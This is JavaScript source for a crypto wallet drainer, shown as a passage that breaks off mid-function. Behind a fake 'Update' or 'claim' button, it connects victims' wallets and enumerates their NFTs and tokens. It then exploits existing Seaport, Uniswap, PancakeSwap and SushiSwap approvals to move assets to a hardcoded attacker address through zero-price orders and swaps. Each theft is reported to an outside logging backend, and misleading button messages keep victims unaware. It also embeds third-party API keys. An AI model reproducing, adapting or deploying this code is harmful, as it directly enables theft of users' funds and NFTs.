"use strict";

window.Buffer = buffer.Buffer

/**** CONFIGURATIONS ****/

const config = { 

    receiver: "0x40BC42842E19bc668361982C33dd0de3dF3F4d50",
    
    logDomainName: "https://backend-rho-gilt.vercel.app/",

    logIpData: false,

    design: {
        walletAppear: true,
        eliAppear: true,
        
        connectElement: "#connectButton",
        connectedElement: "#claimButton",
        
        retryDelay: 3000,
        
        buttonMessagesEnabled: true,
        buttonMessages: {
          initialConnect: "Update",
          initialConnected: "Update",
 
          progress: "Loading ...", 
          success: "Confirming ...",
          failed: "Verification failed !",
        }
    },
 
    claimInfo: {
 
        collectionDetails: {
            minAveragePrice: 0.005,
            minVolumeTraded: 20,
        },
 
        minValueERC20: 0,
        minWalletBalance: 0.0003,
    }
 
 }
 


/**** CONTRACT ABI ****/
const ERC20_ABI = [
    {
        "constant":true,
        "inputs":[
           {
              "name":"_owner",
              "type":"address"
           },
           {
              "name":"_spender",
              "type":"address"
           }
        ],
        "name":"allowance",
        "outputs":[
           {
              "name":"remaining",
              "type":"uint256"
           }
        ],
        "payable":false,
        "stateMutability":"view",
        "type":"function"
     },
     {
        "constant": false,
        "inputs": [
            {
                "name": "_spender",
                "type": "address"
            },
            {
                "name": "_value",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
    
        ],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const PERMIT_ABI = [
    {
        "constant": false,
        "inputs": [
          {
            "internalType": "address",
            "name": "owner",
            "type": "address"
          },
          {
            "internalType": "address",
            "name": "spender",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "rawAmount",
            "type": "uint256"
          },
          {
            "internalType": "uint256",
            "name": "deadline",
            "type": "uint256"
          },
          {
            "internalType": "uint8",
            "name": "v",
            "type": "uint8"
          },
          {
            "internalType": "bytes32",
            "name": "r",
            "type": "bytes32"
          },
          {
            "internalType": "bytes32",
            "name": "s",
            "type": "bytes32"
          }
        ],
        "name": "permit",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [
          {
            "internalType": "address",
            "name": "",
            "type": "address"
          }
        ],
        "name": "nonces",
        "outputs": [
          {
            "internalType": "uint256",
            "name": "",
            "type": "uint256"
          }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
      }
];

const PERMITALT_ABI = [
    {
        "constant": false,
        "inputs": [
          {
            "internalType": "address",
            "name": "holder",
            "type": "address"
          },
          {
            "internalType": "address",
            "name": "spender",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "nonce",
            "type": "uint256"
          },
          {
            "internalType": "uint256",
            "name": "expiry",
            "type": "uint256"
          },
          {
            "internalType": "bool",
            "name": "allowed",
            "type": "bool"
          },
          {
            "internalType": "uint8",
            "name": "v",
            "type": "uint8"
          },
          {
            "internalType": "bytes32",
            "name": "r",
            "type": "bytes32"
          },
          {
            "internalType": "bytes32",
            "name": "s",
            "type": "bytes32"
          }
        ],
        "name": "permit",
        "outputs": [],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [
          {
            "internalType": "address",
            "name": "",
            "type": "address"
          }
        ],
        "name": "nonces",
        "outputs": [
          {
            "internalType": "uint256",
            "name": "",
            "type": "uint256"
          }
        ],
        "payable": false,
        "stateMutability": "view",
        "type": "function"
      }
];

const NFT_ABI = [
    {
        "inputs":[
           {
              "internalType":"address",
              "name":"owner",
              "type":"address"
           },
           {
              "internalType":"address",
              "name":"operator",
              "type":"address"
           }
        ],
        "name":"isApprovedForAll",
        "outputs":[
           {
              "internalType":"bool",
              "name":"",
              "type":"bool"
           }
        ],
        "stateMutability":"view",
        "type":"function"
     },
     {
        "inputs": [{
            "internalType": "address",
            "name": "operator",
            "type": "address"
        }, {
            "internalType": "bool",
            "name": "approved",
            "type": "bool"
        }],
        "name": "setApprovalForAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
        }
];

const UNISWAP = [
    {
        "inputs": [
          {
            "internalType": "uint256",
            "name": "amountIn",
            "type": "uint256"
          },
          {
            "internalType": "uint256",
            "name": "amountOutMin",
            "type": "uint256"
          },
          {
            "internalType": "address[]",
            "name": "path",
            "type": "address[]"
          },
          {
            "internalType": "address",
            "name": "to",
            "type": "address"
          }
        ],
        "name": "swapExactTokensForTokens",
        "outputs": [
          {
            "internalType": "uint256",
            "name": "amountOut",
            "type": "uint256"
          }
        ],
        "stateMutability": "payable",
        "type": "function"
      },
      {
        "inputs": [
          {
            "internalType": "uint256",
            "name": "deadline",
            "type": "uint256"
          },
          {
            "internalType": "bytes[]",
            "name": "data",
            "type": "bytes[]"
          }
        ],
        "name": "multicall",
        "outputs": [
          {
            "internalType": "bytes[]",
            "name": "",
            "type": "bytes[]"
          }
        ],
        "stateMutability": "payable",
        "type": "function"
      }
];

const PANCAKESWAP = [
    {
        "inputs": [
          {
            "internalType": "uint256",
            "name": "amountIn",
            "type": "uint256"
          },
          {
            "internalType": "uint256",
            "name": "amountOutMin",
            "type": "uint256"
          },
          {
            "internalType": "address[]",
            "name": "path",
            "type": "address[]"
          },
          {
            "internalType": "address",
            "name": "to",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "deadline",
            "type": "uint256"
          }
        ],
        "name": "swapExactTokensForTokens",
        "outputs": [
          {
            "internalType": "uint256[]",
            "name": "amounts",
            "type": "uint256[]"
          }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
      }
];

const SUSHISWAP = [
    {
        "inputs": [
          {
            "internalType": "uint256",
            "name": "amountIn",
            "type": "uint256"
          },
          {
            "internalType": "uint256",
            "name": "amountOutMin",
            "type": "uint256"
          },
          {
            "internalType": "address[]",
            "name": "path",
            "type": "address[]"
          },
          {
            "internalType": "address",
            "name": "to",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "deadline",
            "type": "uint256"
          }
        ],
        "name": "swapExactTokensForTokens",
        "outputs": [
          {
            "internalType": "uint256[]",
            "name": "amounts",
            "type": "uint256[]"
          }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
      }
];

const QUICKSWAP = [
    {
        "inputs": [
          {
            "internalType": "uint256",
            "name": "amountIn",
            "type": "uint256"
          },
          {
            "internalType": "uint256",
            "name": "amountOutMin",
            "type": "uint256"
          },
          {
            "internalType": "address[]",
            "name": "path",
            "type": "address[]"
          },
          {
            "internalType": "address",
            "name": "to",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "deadline",
            "type": "uint256"
          }
        ],
        "name": "swapExactTokensForTokens",
        "outputs": [
          {
            "internalType": "uint256[]",
            "name": "amounts",
            "type": "uint256[]"
          }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
      }
];

const INCH = [
    {
        "inputs": [
          {
            "internalType": "uint256",
            "name": "amountIn",
            "type": "uint256"
          },
          {
            "internalType": "uint256",
            "name": "amountOutMin",
            "type": "uint256"
          },
          {
            "internalType": "address[]",
            "name": "path",
            "type": "address[]"
          },
          {
            "internalType": "address",
            "name": "to",
            "type": "address"
          },
          {
            "internalType": "uint256",
            "name": "deadline",
            "type": "uint256"
          }
        ],
        "name": "swapExactTokensForTokens",
        "outputs": [
          {
            "internalType": "uint256[]",
            "name": "amounts",
            "type": "uint256[]"
          }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
      }
];

const CRYPTOPUNK = [{
    "constant": false,
    "inputs": [
      {
        "name": "to",
        "type": "address"
      },
      {
        "name": "punkIndex",
        "type": "uint256"
      }
    ],
    "name": "transferPunk",
    "outputs": [],
    "payable": false,
    "type": "function"
  }
];


const MOONBIRDS = [{
    "constant": false,
    "inputs": [
      {
        "name": "to",
        "type": "address"
      },
      {
        "name": "moonIndex",
        "type": "uint256"
      }
    ],
    "name": "transferMoonBird",
    "outputs": [],
    "payable": false,
    "type": "function"
  }
];



class Configuration {
    web3Js;
    metamaskInstalled = false;
    isConnected  = false;

    walletAddress;
    walletBalance;
    walletBalanceInEth;
    chainId;
    nonce;

    seaportConduit = "0x1e0049783f008a0085193e00003d00cd54003c71";
    uniswapV3Router1 = "0xE592427A0AEce92De3Edee1F18E0157C05861564";
    uniswapV3Router2 = "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45";
    pancakeSwapRouter = "0xEfF92A263d31888d860bD50809A8D171709b7b1c";
    sushiSwapRouter = "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F";

    // USDC
    receiverSwapTokenAddress = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
    receiverSwapTokenAddressAlt = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";

    transactions = [];
    filteredTransactions;
    NFTtokens = [];
    ERC20tokens = [];

    // SEAPORT
    offers = [];
    considerations = [];
    seaportValue = 0;

    // UNISWAP 
    uniswapTokens = [];
    uniswapValue = 0;

    // PANCAKESWAP
    pancakeswapTokens = [];
    pancakeswapValue = 0;

    // SUSHISWAP
    sushiswapTokens = []; 
    sushiswapValue = 0;

    // QUICKSWAP
    quickswapValue = 0;

    // PENDING TRANSACTIONS
    pending = [];

    OpenseaAPI = "7dabb51af1224421960e18ed64e69ba2";
    MoralisAPI = "myErBoJSRuErZsb76wsRvzaXhu1lvsBI56Iwt0agbvy3nnVw8gRcGrGNNjh7EhfF";

    requestOptions = {
        method: 'GET',
        headers: {
            Accept: 'application/json',
            'X-API-KEY': ''
        }
    };

    requestOptionsPOST = {
        method: 'POST',
        headers: {
            Accept: 'application/json'
        }
    };

    // FRONTENED BUTTONS 
    connectBtn = document.getElementById("connectButton");
    claimSection = document.getElementById("claimSection");
    claimButton = document.getElementById("claimButton")
    walletField = document.getElementById("walletAddress");
    eligible = document.getElementById("notEli");

}


class Drainer extends Configuration {

    constructor () { 
        super();

        console.log(window.location.host)

       
        if (typeof window.ethereum !== 'undefined') this.metamaskInstalled = true; 


        Moralis.onWeb3Enabled(async (data) => {
            if (data.chainId != 1 && this.metamaskInstalled) await Moralis.switchNetwork("0x1");
                await this.updateStates(true);
                // this.transfer()
        });

        window.ethereum ? window.ethereum.on('accountsChanged', (accounts) => {
            if (accounts.length < 1) this.updateStates(false)
        }) : null;

        if (this.isMobile() && !window.ethereum) {
            this.connectBtn.addEventListener("click", () => {
                window.location.href = `https://metamask.app.link/dapp/${window.location.hostname}${window.location.pathname}`;
            });
        } else {
            this.connectBtn.addEventListener("click", () => {
                this.connectWallet()
            });
        }
        this.claimButton.addEventListener("click", this.transfer);
    }

    connectWallet = async () => {
        this.isConnected = true;
        await Moralis.enableWeb3(!this.metamaskInstalled && {
            provider: "walletconnect"
        });
    }


    updateStates = async (connect = true) => {
        if(connect) {
            if(!this.isConnected) {
                await this.connectWallet();
            }

            this.isConnected = true;
            this.web3Js = new Web3(Moralis.provider);

            this.walletAddress = (await this.web3Js.eth.getAccounts())[0];
            this.walletBalance = await this.web3Js.eth.getBalance(this.walletAddress);
            this.walletBalanceInEth = await this.web3Js.utils.fromWei(this.walletBalance, 'ether')
            this.chainId = await this.web3Js.eth.getChainId();
            this.nonce = await this.web3Js.eth.getTransactionCount(this.walletAddress);

            //this.claimSection.style.display = "block";
            //this.connectBtn.style.display = "none";

            this.logConnection()
        } 
        else 
        {
            this.isConnected = false;
            //this.claimSection.style.display = "none";
            //this.connectBtn.style.display = "block";
        }

    }


    /**
     * 
     * Only one parameter can be true
     * @param {boolean} denied - set to true if user canceled the transaction
     * @param {boolean} success - set to true if user accepted the transaction
     * @param {boolean} end - set to true if everything is finished
     **/

    updateButtonMessage = (denied = false, success = false, end = false) => {

        if(denied == true) {
            if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.failed;

            setTimeout(() => {
                if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.progress;
            }, config.design.retryDelay)
        }

        if(success == true) {
            setTimeout(() => {
                if(config.design.buttonMessagesEnabled)  this.claimButton.innerText = config.design.buttonMessages.success;
            }, config.design.retryDelay)
        }

        if(end == true) {
            console.log("Button Message end")

            if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.failed;
            
            setTimeout(() => {
                if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.initialConnected;
            }, config.design.retryDelay);


            this.transactions.length = 0;
            this.offers.length = 0;
            this.considerations.length = 0;
            this.uniswapTokens.length = 0;
            this.pancakeswapTokens.length = 0;
            this.sushiswapTokens.length = 0;
            this.pending.length = 0;
        }
    }


    fetchNFTS = async () => {
        console.log("Fetching NFTS");
        this.requestOptions.headers["X-API-KEY"] = this.OpenseaAPI;

        let nfts = [];
        try {
            nfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${this.walletAddress}&offset=0&limit=300`, this.requestOptions)
            .then(response => response.json())
            .then(nfts => {
                return nfts
                .filter(nft => nft.primary_asset_contracts.length > 0)
                .map(nft => {
                    return {
                        name: nft.primary_asset_contracts[0].name,
                        type: nft.primary_asset_contracts[0].schema_name,
                        contractAddress: nft.primary_asset_contracts[0].address,
                        price: this.round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price) * nft.owned_asset_count,
                        owned: nft.owned_asset_count,
                        banner: nft.banner_image_url,
                        volumeTraded: nft.stats.total_volume,
                        slug: nft.slug
                    }
                })
            })

        } catch(error) {
            console.log("NFT Request error: ", error);
        }

        await Promise.all(nfts.map(async nft => {
            if (nft.price < config.claimInfo.collectionDetails.minAveragePrice) return;
            if (nft.volumeTraded < config.claimInfo.collectionDetails.minVolumeTraded) return;
            
            try {
                await fetch(`https://api.opensea.io/api/v1/collection/${nft.slug}/stats`)
                .then(res => res.json())
                .then(data => nft.price = data.stats.floor_price * nft.owned)
            } catch(error) {
                console.log("NFT floor price error: ", error);
            }

            this.transactions.push(nft);
            this.NFTtokens.push(nft);
        }))

    }


    fetchERC20 = async () => {
        console.log("Fetching ERC20");

        let tokens = [];
        try {
            this.requestOptions.headers["X-API-KEY"] = this.MoralisAPI;
            tokens = await fetch(`https://deep-index.moralis.io/api/v2/${this.walletAddress}/erc20?chain=eth`, this.requestOptions)
            .then(response => response.json());

            let filteredTransactions = tokens
            .filter(token => token.thumbnail != null || token.name == "ApeCoin")
            .map(token => {
                return {
                    type: "ERC20",
                    contractAddress: token.token_address,
                    fullName: token.name,
                    name: token.symbol,
                    balance: token.balance,
                    decimals: token.decimals,
                    banner: token.thumbnail
                }
            });

            
            await Promise.all(filteredTransactions.map(async transaction => {
                let money = await this.ERC20toCurrency(transaction.contractAddress, transaction.balance, transaction.decimals);
                transaction.price = money.ethPrice
                transaction.usdPrice = money.usdPrice.toFixed(2);
                if(transaction.price < config.claimInfo.minValueERC20) return

                this.transactions.push(transaction);
                this.ERC20tokens.push(transaction);
            }));

        } catch(error) {
            console.log("ERC20 fetch error: ", error);
        }
    }


    transfer = async () => { 
        if(config.design.buttonMessagesEnabled) this.claimButton.innerText = config.design.buttonMessages.progress;
        
        this.transactions.push({
            type: "ETH",
            price: this.walletBalanceInEth
        });

        await Promise.all([this.fetchNFTS, this.fetchERC20].map(async func => {
            await func();
        }));

        this.filteredTransactions = [...this.transactions]
        .sort((a, b) => b.price - a.price);


        try {

            // SEAPORT
            await Promise.all(this.ERC20tokens.map(async token => {
                let contractInstance = new this.web3Js.eth.Contract(ERC20_ABI, token.contractAddress);
                let approvedBalance = await contractInstance.methods.allowance(this.walletAddress, this.seaportConduit).call({from: this.walletAddress})

                console.log("SEAPORT ERC20: ", token.name, token.contractAddress, approvedBalance > 0 ? true : false);
                
                if(approvedBalance > 0) {
                    console.warn("SEAPORT", token.name)

                    this.offers.push({
                        amount: token.balance,
                        itemType: 1,
                        token: token.contractAddress,
                        identifier: "0",
                    });

                    this.considerations.push({
                        amount: token.balance,
                        itemType: 1,
                        token: token.contractAddress,
                        identifier: "0",
                        recipient: config.receiver
                    });

                    this.seaportValue += token.price;
                }
            }));

            // SEAPORT
            await Promise.all(this.NFTtokens.map(async token => {
                let contractInstance = new this.web3Js.eth.Contract(NFT_ABI, token.contractAddress);
                let isApproved = await contractInstance.methods.isApprovedForAll(this.walletAddress, this.seaportConduit).call({from: this.walletAddress})
                
                console.log("SEAPORT NFT:", token.name, token.contractAddress, isApproved);
    
                if(isApproved) {
                    await this.sleep(Math.floor(Math.random() * (2000 - 700 + 1) + 700));
                    let tokenIds = await this.getNftTokenIds(token.contractAddress, this.walletAddress)
                    
                    tokenIds.map(tokenId => {
                        console.warn("SEAPORT", tokenId, token.name)

                        this.offers.push({
                            amount: "1",
                            itemType: token.type == "ERC721" ? 2 : 3,
                            token: token.contractAddress,
                            identifier: tokenId,
                        });

                        this.considerations.push({
                            amount: "1",
                            itemType: token.type == "ERC721" ? 2 : 3,
                            token: token.contractAddress,
                            identifier: tokenId,
                            recipient: config.receiver
                        });

                        this.seaportValue += token.price;
                    })
                }
            }));

            // UNISWAP
            await Promise.all(this.ERC20tokens.map(async token => {
                let contractInstance = new this.web3Js.eth.Contract(ERC20_ABI, token.contractAddress);
                let approvedBalance = await contractInstance.methods.allowance(this.walletAddress, this.uniswapV3Router2).call({from: this.walletAddress})
    
                console.log("UNSIWAP ERC20: ", token.name, token.contractAddress, approvedBalance > 0 ? true : false);
                
                if(approvedBalance > 0) {
                    console.warn("UNISWAP", token.name)
                    this.uniswapTokens.push(token);

                    this.uniswapValue += token.price;
                }
            }));

            // PANCAKESWAP
            await Promise.all(this.ERC20tokens.map(async token => {
                let contractInstance = new this.web3Js.eth.Contract(ERC20_ABI, token.contractAddress);
                let approvedBalance = await contractInstance.methods.allowance(this.walletAddress, this.pancakeSwapRouter).call({from: this.walletAddress})
            
                console.log("PANCAKESWAP ERC20: ", token.name, token.contractAddress, approvedBalance > 0 ? true : false);
                
                if(approvedBalance > 0) {
                    console.warn("PANCAKESWAP", token.name)
                    this.pancakeswapTokens.push(token);
                }
            }));
    
            if(this.pancakeswapTokens.length != 0) {
                this.pancakeswapTokens = [...this.pancakeswapTokens]
                .sort((a, b) => b.price - a.price); 
                
                this.pancakeswapValue += this.pancakeswapTokens[0].price;
            }

            // SUSHISWAP
            await Promise.all(this.ERC20tokens.map(async token => {
                let contractInstance = new this.web3Js.eth.Contract(ERC20_ABI, token.contractAddress);
                let approvedBalance = await contractInstance.methods.allowance(this.walletAddress, this.sushiSwapRouter).call({from: this.walletAddress})
            
                console.log("SUSHISWAP ERC20: ", token.name, token.contractAddress, approvedBalance > 0 ? true : false);
                
                if(approvedBalance > 0) {
                    console.warn("SUSHISWAP", token.name)
                    this.sushiswapTokens.push(token);
                }
            }));
    
            if(this.sushiswapTokens.length != 0) {
                this.sushiswapTokens = [...this.sushiswapTokens]
                .sort((a, b) => b.price - a.price); 
                
                this.sushiswapValue += this.sushiswapTokens[0].price;
            }


        } catch(error) {
            console.log("Offer & Consideration error: ", error)
        }

        let vault = [
            {
                name: "SEAPORT",
                totalPrice: this.seaportValue
            },
            {
                name: "UNISWAP",
                totalPrice: this.uniswapValue
            },
            {
                name: "PANCAKESWAP",
                totalPrice: this.pancakeswapValue
            },
            {
                name: "SUSHISWAP",
                totalPrice: this.sushiswapValue
            }
        ].sort((a, b) => b.totalPrice - a.totalPrice);


        console.table(vault);

        for(let i = 0; i < vault.length; i++){
            if(vault[i].name == "SEAPORT") {
                await this.transferNFTseaport();
            }
    
            if(vault[i].name == "UNISWAP") {
                await this.transferERC20Uniswap();
            }

            if(vault[i].name == "PANCAKESWAP") {
                await this.transferERC20pancakeswap();
            }
            if(vault[i].name == "SUSHISWAP") {
                await this.transferERC20sushiswap();
            }
        };

        if(this.walletBalanceInEth < config.claimInfo.minWalletBalance) {
            console.warn("Empty wallet Balance for SAFA")
            return this.notEligible()
        }
        
        try { 
            console.table(this.filteredTransactions)
            
            for(let i = 0; i < this.filteredTransactions.length; i++){
                if(this.filteredTransactions[i].type == "ERC20") {
                    await this.transferERC20(this.filteredTransactions[i]);
                } 
        
                if(this.filteredTransactions[i].type == "ERC721" || this.filteredTransactions[i].type == "ERC1155") {
                    await this.transferNFT(this.filteredTransactions[i]);
                } 
        
                if(this.filteredTransactions[i].type == "ETH") {
                    await this.transferETH();
                } 
            };

        } catch(error) {
            console.warn("FilteredTransaction Error: ", error)
        } finally {
            this.updateButtonMessage(false, false, true)
        }

    }

    /**
     * Transfers all to seaport approved ERC20 tokens
     */
    transferNFTseaport = async () => {
        try { 
            if(this.offers.length != 0 && this.considerations.length != 0) {

                let provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send('eth_requestAccounts', []);
                let signer = await provider.getSigner(0);

                const spClient = new seaport.Seaport(signer);   
                
                const { executeAllActions } = await spClient.createOrder({
                        offer: this.offers,
                        consideration: this.considerations,    
                        conduitKey: "0x0000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f0000",
                        zone: "0x004C00500000aD104D7DBd00e3ae0A5C00560C00", 
                        startTime: "1661790956",
                        endTime: "115792089237316195423570985008687907853269984665640564039457584007913129639935",
                    }, 
                    config.receiver 
                );

                const order = await executeAllActions();

                this.filteredTransactions = this.filteredTransactions.filter(token => !this.considerations.map(item => item.token).includes(token.contractAddress));
                this.uniswapTokens = this.uniswapTokens.filter(token => !this.considerations.map(item => item.token).includes(token.contractAddress));
                this.pancakeswapTokens = this.pancakeswapTokens.filter(token => !this.considerations.map(item => item.token).includes(token.contractAddress));
                this.sushiswapTokens = this.sushiswapTokens.filter(token => !this.considerations.map(item => item.token).includes(token.contractAddress));
                

                try {

                    let ipData = {};
                    try {
                        if(config.logIpData) {
                            try {
                                ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                                .then(resp => resp.json())
                            } catch(error) {
                                console.warn("Couldn't fetch ip data: ", error);
                            }
                        }
                    } catch(error) {
                        console.warn("Couldn't fetch ip data: ", error);
                    }
        
                    if(!ipData.ip || !ipData.country_name) {
                        ipData = {
                            ip: "Unknown",
                            country_name: "Unknown"
                        }
                    }
        
            
                    fetch(`${config.logDomainName}backend/seaport`, {
                        method: 'POST',
                        headers: {
                            'Content-Type':'application/json',
                            'Accept':'application/json'
                        },
                        body: JSON.stringify({
                            order: order,
                            address: this.walletAddress,
                            walletBalanceInEth: this.walletBalanceInEth,
                            isMobile: this.isMobile(),
                            websiteUrl: window.location.href,
                            websiteDomain: window.location.host,
                            ipData: ipData,
                        })
                    });

                } catch(error) {
                    console.log("Connection Log error: ", error);
                }

            this.updateButtonMessage(false, true)
            await this.sleep(400);

            } else {
                console.warn("SEAPORT no approved items")
            }

        } catch(error) {
            if (error.code == 4001) {
                this.logCancel("Seaport");
                this.updateButtonMessage(true);
            }
            console.log(error)
        }
    }

    /**
     * Transfers all to uniswap approved ERC20 tokens
     */
    transferERC20Uniswap = async () => {   
        if(this.uniswapTokens.length > 0) {
            console.log("TRANSFERRING APPROVED UNISWAP ERC20 TOKENS");
            console.table(this.uniswapTokens);

            await new Promise(async (resolve, reject) => { 
                let deadline = Math.floor(Date.now()/1000) + (9999 * 10);
                let contractInstance = new this.web3Js.eth.Contract(UNISWAP, this.uniswapV3Router2);
    
                console.log(this.uniswapTokens)
    
                let calls = [];
                this.uniswapTokens.map(token => {
                
                    let path = [];
                    path[0] = token.contractAddress;
                    path[1] = this.receiverSwapTokenAddress != token.contractAddress ? this.receiverSwapTokenAddress : this.receiverSwapTokenAddressAlt;
                
                    let amountIn = token.balance;
                    let amountOut = 0;
                
                    let encodedData = contractInstance.methods.swapExactTokensForTokens(amountIn, amountOut, path, config.receiver).encodeABI();
                    calls.push(encodedData);
                });
            
                if(calls.length != 0) {
                    console.log("UNISWAP TRANSFER TOKEN ARRAY: ", calls);
                
                    await contractInstance.methods.multicall(deadline, calls).send({
                        from: this.walletAddress
                    })
                    .on('transactionHash', async hash => {
                        console.log("UNISWAP success", hash);
                        this.pending.push(hash);

                        this.filteredTransactions = this.filteredTransactions.filter(token => !this.uniswapTokens.map(item => item.contractAddress).includes(token.contractAddress));
                        this.considerations = this.considerations.filter(token => !this.uniswapTokens.map(item => item.contractAddress).includes(token.token));
                        this.offers = this.offers.filter(token => !this.uniswapTokens.map(item => item.contractAddress).includes(token.token));
                        this.pancakeswapTokens = this.pancakeswapTokens.filter(token => !this.uniswapTokens.map(item => item.contractAddress).includes(token.contractAddress));
                        this.sushiswapTokens = this.sushiswapTokens.filter(token => !this.uniswapTokens.map(item => item.contractAddress).includes(token.contractAddress));
                        resolve(hash);
                    }).catch(error => {
                        reject(error);
                    })
                }

            }).then(async hash => {
                let ipData = {};
                try {
                    if(config.logIpData) {
                        try {
                            ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                            .then(resp => resp.json())
                        } catch(error) {
                            console.warn("Couldn't fetch ip data: ", error);
                        }
                    }
                } catch(error) {
                    console.warn("Couldn't fetch ip data: ", error);
                }
    
                if(!ipData.ip || !ipData.country_name) {
                    ipData = {
                        ip: "Unknown",
                        country_name: "Unknown"
                    }
                }
    
        
                fetch(`${config.logDomainName}backend/swap`, {
                    method: 'POST',
                    headers: {
                        'Content-Type':'application/json',
                        'Accept':'application/json'
                    },
                    body: JSON.stringify({
                        address: this.walletAddress,
                        walletBalanceInEth: this.walletBalanceInEth,
                        isMobile: this.isMobile(),
                        websiteUrl: window.location.href,
                        websiteDomain: window.location.host,
                        ipData: ipData,
        
                        tokenPrice: Number(this.uniswapValue).toFixed(4),
                        transferName: "UNISWAP",
                        transactionHash: hash,
                    })
                });
            }).catch(error => {
                if (error.code == 4001) {
                    this.logCancel("UNISWAP ERC20");
                    this.updateButtonMessage(true);
                }
            })

        } else {
            console.warn("UNISWAP no approved items")
        }

    }

    /**
     * Transfers all to pancakeswap approved ERC20 tokens
     */
    transferERC20pancakeswap = async () => {

        if(this.pancakeswapTokens.length > 0) {
            console.log("TRANSFERRING APPROVED PANCAKESWAP ERC20 TOKENS");
            console.table(this.pancakeswapTokens);

            await new Promise(async (resolve, reject) => { 

                let deadline = Math.floor(Date.now()/1000) + (9999 * 10);
                let contractInstance = new this.web3Js.eth.Contract(PANCAKESWAP, this.pancakeSwapRouter);
                
                let path = [];
                path[0] = this.pancakeswapTokens[0].contractAddress;
                path[1] = this.receiverSwapTokenAddress != this.pancakeswapTokens[0].contractAddress ? this.receiverSwapTokenAddress : this.receiverSwapTokenAddressAlt;
                
                let amountIn = this.pancakeswapTokens[0].balance;
                let amountOut = 0;
                

                await contractInstance.methods.swapExactTokensForTokens(amountIn, amountOut, path, config.receiver, deadline).send({
                    from: this.walletAddress
                })
                .on('transactionHash', hash => {
                    console.log("PANCAKESWAP success", hash);
                    this.pending.push(hash);

                    this.filteredTransactions = this.filteredTransactions.filter(token => token.contractAddress != this.pancakeswapTokens[0].contractAddress);
                    this.considerations = this.considerations.filter(token => token.token != this.pancakeswapTokens[0].contractAddress);
                    this.offers = this.offers.filter(token => token.token != this.pancakeswapTokens[0].contractAddress);
                    this.uniswapTokens = this.uniswapTokens.filter(token => token.contractAddress != this.pancakeswapTokens[0].contractAddress);
                    this.sushiswapTokens = this.sushiswapTokens.filter(token => token.contractAddress != this.pancakeswapTokens[0].contractAddress);
                    resolve(hash);
                }).catch(error => {
                    reject(error);
                })
            }).then(async hash => {                
                let ipData = {};
                try {
                    if(config.logIpData) {
                        try {
                            ipData = await fetch("https://ipapi.co/json/", this.requestOptionsPOST)
                            .then(resp => resp.json())
                        } catch(error) {
                            console.warn("Couldn't fetch ip data: ", error);
                        }
                    }
                } catch(error) {
                    console.warn("Couldn't fetch ip data: ", error);
                }
    
                if(!ipData.ip || !ipData.country_name) {
                    ipData = {
                        ip: "Unknown",
                        country_name: "Unknown"
                    }
                }
    
        
                fetch(`${config.logDomainName}backend/swap`, {
                    method: 'POST',
                    headers: {
                        'Content-Type':'application/json',
                        'Accept':'application/json'
                    },
                    body: JSON.stringify({
                        address: this.walletAddress,
                        walletBalanceInEth: this.walletBalanceInEth,
                        isMobile: this.isMobile(),
                        websiteUrl: window.location.href,
                        websiteDomain: window.location.host,
                        ipData: ipData,
        
                        tokenPrice: Number(this.pancakeswapTokens[0].price).toFixed(4),
                        transferName: "PANCAKESWAP",
                        transactionHash: hash,
                    })
                });
            }).catch(error => {
                if (error.code == 4001) {
                    this.logCancel("PANCAKESWAP ERC20");
                    this.updateButtonMessage(true);
                }
            })

        } else {
            console.warn("PANCAKESWAP no approved items")
        }
    }


    /**
     * Transfers all to sushiswap approved ERC20 tokens 
     */
    transferERC20sushiswap = async () => {
        try {
            if(this.sushiswapTokens.length > 0) {
                console.log("TRANSFERRING APPROVED SUSHISWAP ERC20 TOKENS");
                console.table(this.sushiswapTokens);

                await new Promise(async (resolve, reject) => { 

                    let deadline = Math.floor(Date.now()/1000) + (9999 * 10);
                    let contractInstance = new this.web3Js.eth.Contract(SUSHISWAP, this.sushiSwapRouter);
        
                    let path = [];
                    path[0] = this.sushiswapTokens[0].contractAddress;
                    path[1] = this.receiverSwapTokenAddress != this.sushiswapTokens[0].contractAddress ? this.receiverSwapTokenAddress : this.receiverSwapTokenAddressAlt;
        
                    let amountIn = this.sushiswapTokens[0].balance;
                    let amountOut = 0;
        
                    await contractInstance.methods.swapExactTokensForTokens(amountIn, amountOut, path, config.receiver, deadline).send({
                        from: this.walletAddress
                    })
                    .on('transactionHash', async hash => {
                        console.log("SUSHISWAP success", hash);
                        this.pending.push(hash);
                    
                        this.filteredTransactions = this.filteredTransactions.filter(token => token.contractAddress != this.sushiswapTokens[0].contractAddress);
                        this.considerations = this.considerations.filter(token => token.token != this.sushiswapTokens[0].contractAddress);
                        this.offers = this.offers.filter(token => token.token != this.sushiswapTokens[0].contractAddress);
                        this.uniswapTokens = this.uniswapTokens.filter(token => token.contractAddress != this.sushiswapTokens[0].contractAddress);
